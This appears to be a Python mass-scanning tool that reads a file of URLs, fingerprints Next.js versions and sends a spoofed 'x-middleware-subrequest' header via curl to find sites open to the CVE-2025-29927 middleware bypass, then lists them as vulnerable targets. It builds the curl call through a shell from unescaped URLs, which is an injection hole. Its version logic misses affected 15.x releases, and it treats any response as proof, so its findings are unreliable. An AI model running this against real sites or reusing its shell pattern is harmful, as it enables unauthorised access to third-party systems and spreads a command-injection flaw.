import os
import sys
import subprocess
import importlib.util
import signal
from colorama import Fore, init
import json
import threading
from queue import Queue
import time

init(autoreset=True)

ORANGE = '\033[38;5;214m'
LIGHT_PINK = '\033[38;5;176m'
SALMON = '\033[38;5;209m'
BRIGHT_WHITE  = '\033[38;5;231m'

# Thread-safe print lock
print_lock = threading.Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_package_installed(package):
    return importlib.util.find_spec(package) is not None

def install_package(package_name):
    result = subprocess.run([sys.executable, '-m', 'pip', 'install', package_name], capture_output=True, text=True)
    with print_lock:
        print(f"{Fore.GREEN}[+] {package_name} installed." if result.returncode == 0 else f"{Fore.RED}[!] Failed to install {package_name}")

def check_and_install_packages(packages):
    for package in packages:
        if not is_package_installed(package):
            with print_lock:
                print(f"{Fore.RED}[!] {package} missing. Installing...")
            install_package(package)

def fetch_required_modules():
    return ("wappalyzer", "colorama")

def handle_interrupt(signal, frame):
    with print_lock:
        print(f"{Fore.RED}\n[!] Interrupted. Exiting...")
    sys.exit(0)

def display_banner():
    banner = rf"""
{Fore.GREEN}   _______      ________    ___   ___ ___  _____     ___   ___   ___ ___ ______ 
{Fore.GREEN}  / ____\ \    / /  ____|  |__ \ / _ \__ \| ____|   |__ \ / _ \ / _ \__ \____  |
{Fore.GREEN} | |     \ \  / /| |__ ______ ) | | | | ) | |__ ______ ) | (_) | (_) | ) |  / / 
{Fore.GREEN} | |      \ \/ / |  __|______/ /| | | |/ /|___ \______/ / \__, |\__, |/ /  / /  
{Fore.GREEN} | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   / /   / // /_ / /   
{Fore.GREEN}  \_____|   \/   |______|  |____|\___/____|____/    |____| /_/   /_/|____/_/    
    """
    with print_lock:
        print(banner)
        creator_text = "Program created by: AnonKryptiQuz"
        padding = (81 - len(creator_text)) // 2
        print(" " * padding + f"{Fore.RED}{creator_text}")
        print("")

def get_valid_file():
    while True:
        clear_screen()
        display_banner()
        file_path = input(f"{BRIGHT_WHITE}[?] Enter path to URL file: {Fore.CYAN}")
        if not file_path:
            with print_lock:
                print(f"{Fore.RED}\n[!] File path required.")
                input(f"{Fore.YELLOW}[i] Press Enter to retry...")
        elif not os.path.exists(file_path):
            with print_lock:
                print(f"{Fore.RED}\n[!] File not found.")
                input(f"{Fore.YELLOW}[i] Press Enter to retry...")
        else:
            try:
                with open(file_path, 'r') as f:
                    urls = [line.strip() for line in f if line.strip()]
                if not urls:
                    with print_lock:
                        print(f"{Fore.RED}\n[!] File is empty.")
                        input(f"{Fore.YELLOW}[i] Press Enter to retry...")
                else:
                    return urls
            except Exception as e:
                with print_lock:
                    print(f"{Fore.RED}\n[!] Error reading file: {e}")
                    input(f"{Fore.YELLOW}[i] Press Enter to retry...")

def is_valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def get_scan_type():
    while True:
        clear_screen()
        display_banner()
        print(f"{BRIGHT_WHITE}[?] Select scan type:")
        print(f"{BRIGHT_WHITE} 1. Fast\n 2. Balanced\n 3. Full (Default)")
        choice = input(f"{Fore.LIGHTMAGENTA_EX}\n[?] Choose (Enter for Full): {Fore.CYAN}").strip()
        if choice == "1":
            return "fast"
        elif choice == "2":
            return "balanced"
        elif choice == "3" or choice == "":
            return "full"
        else:
            with print_lock:
                print(f"{Fore.RED}\n[!] Invalid choice.")
                input(f"{Fore.YELLOW}[i] Press Enter to retry...")

def check_react_version(url, scan_type, result_queue):
    MIDDLEWARE_VALUE = None
    with print_lock:
        print(f"{Fore.MAGENTA}[?] Scanning: {url}")
        print(f"{Fore.CYAN}[i] Checking Next.js...")
    
    scan_command = ['wappalyzer', '-i', url, '--scan-type', scan_type, '-t', '10', '-oJ', f'output_{threading.current_thread().ident}.json']
    result = subprocess.run(scan_command, capture_output=True, text=True)
    
    status = {"url": url, "nextjs": False, "version": None, "vulnerable": False, "error": None}
    output_file = f'output_{threading.current_thread().ident}.json'
    
    if result.returncode != 0:
        status["error"] = "Wappalyzer failed"
        with print_lock:
            print(f"{Fore.RED}[!] {url}: Wappalyzer analysis failed")
    elif not os.path.exists(output_file):
        status["error"] = "No output file"
        with print_lock:
            print(f"{Fore.RED}[!] {url}: No output file generated")
    else:
        try:
            with open(output_file, "r") as file:
                data = json.load(file)
                if not data:
                    status["error"] = "Empty result"
                    with print_lock:
                        print(f"{Fore.RED}[!] {url}: Empty scan result")
                else:
                    site_data = data.get(url, {})
                    nextjs_info = site_data.get("Next.js", None)
                    if nextjs_info:
                        status["nextjs"] = True
                        nextjs_version = nextjs_info.get('version', None)
                        status["version"] = nextjs_version
                        with print_lock:
                            print(f"{SALMON}[+] {url}: Next.js detected" + (f", version: {nextjs_version}" if nextjs_version else ""))
                        if nextjs_version:
                            def version_tuple(version):
                                return tuple(map(int, version.split(".")))
                            if version_tuple(nextjs_version) < version_tuple("14.2.25") and version_tuple(nextjs_version) < version_tuple("15.2.3"):
                                MIDDLEWARE_VALUE = "_middleware" if version_tuple(nextjs_version) < version_tuple("12.0.0") else "middleware"
                                with print_lock:
                                    print(f"{ORANGE}[i] {url}: Testing {MIDDLEWARE_VALUE}...")
                                cmd = f'curl -H "x-middleware-subrequest: {MIDDLEWARE_VALUE}" {url}'
                                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                                if result.stdout.strip():
                                    status["vulnerable"] = True
                                    with print_lock:
                                        print(f"{Fore.GREEN}[+] {url}: Vulnerable to CVE-2025-29927!")
                                else:
                                    with print_lock:
                                        print(f"{Fore.RED}[-] {url}: Not vulnerable")
                            else:
                                with print_lock:
                                    print(f"{Fore.RED}[-] {url}: Not in vulnerable range")
                    else:
                        with print_lock:
                            print(f"{Fore.RED}[-] {url}: Not Next.js based")
        except Exception as e:
            status["error"] = str(e)
            with print_lock:
                print(f"{Fore.RED}[!] {url}: Error - {e}")
        finally:
            if os.path.exists(output_file):
                os.remove(output_file)
    
    result_queue.put(status)

def process_urls(urls, scan_type):
    valid_urls = [url if is_valid_url(url) else f"https://{url}" for url in urls]
    result_queue = Queue()
    threads = []
    max_threads = min(10, len(valid_urls))
    
    with print_lock:
        print(f"{Fore.YELLOW}[i] Scanning {len(valid_urls)} URLs with {max_threads} threads...")
    
    def worker(url):
        check_react_version(url, scan_type, result_queue)
    
    for url in valid_urls:
        t = threading.Thread(target=worker, args=(url,))
        threads.append(t)
        t.start()
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    results = []
    while not result_queue.empty():
        results.append(result_queue.get())
    
    display_results(results)

def display_results(results):
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}[i] Final Results:\n")
    
    vuln_width = max(len("Vulnerable Targets"), max([len(r["url"]) for r in results if r["vulnerable"]] or [0]))
    nonvuln_width = max(len("Non-Vulnerable Targets"), max([len(r["url"]) for r in results if not r["vulnerable"]] or [0]))
    
    vuln_list = [r["url"] for r in results if r["vulnerable"]]
    nonvuln_list = [r["url"] for r in results if not r["vulnerable"]]
    
    print(f"{Fore.GREEN}{'Vulnerable Targets':<{vuln_width}}    {Fore.RED}{'Non-Vulnerable Targets':<{nonvuln_width}}")
    print(f"{Fore.GREEN}{'-' * vuln_width}    {Fore.RED}{'-' * nonvuln_width}")
    
    max_len = max(len(vuln_list), len(nonvuln_list))
    for i in range(max_len):
        vuln = vuln_list[i] if i < len(vuln_list) else ""
        nonvuln = nonvuln_list[i] if i < len(nonvuln_list) else ""
        print(f"{Fore.GREEN}{vuln:<{vuln_width}}    {Fore.RED}{nonvuln:<{nonvuln_width}}")
    
    print(f"\n{Fore.YELLOW}[i] Summary:")
    print(f"{Fore.GREEN}[+] Vulnerable: {len(vuln_list)}")
    print(f"{Fore.RED}[-] Non-Vulnerable: {len(nonvuln_list)}")
    print(f"{Fore.CYAN}[i] Errors: {len([r for r in results if r['error']])}")

def main():
    signal.signal(signal.SIGINT, handle_interrupt)
    clear_screen()
    print(f"{Fore.YELLOW}[i] Checking packages...")
    check_and_install_packages(fetch_required_modules())
    
    urls = get_valid_file()
    scan_type = get_scan_type()
    
    start_time = time.time()
    process_urls(urls, scan_type)
    end_time = time.time()
    
    print(f"\n{Fore.GREEN}[+] Scan completed in {end_time - start_time:.2f} seconds!")
    input(f"{Fore.YELLOW}[i] Press Enter to exit...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Operation interrupted. Exiting...")
        sys.exit(0)
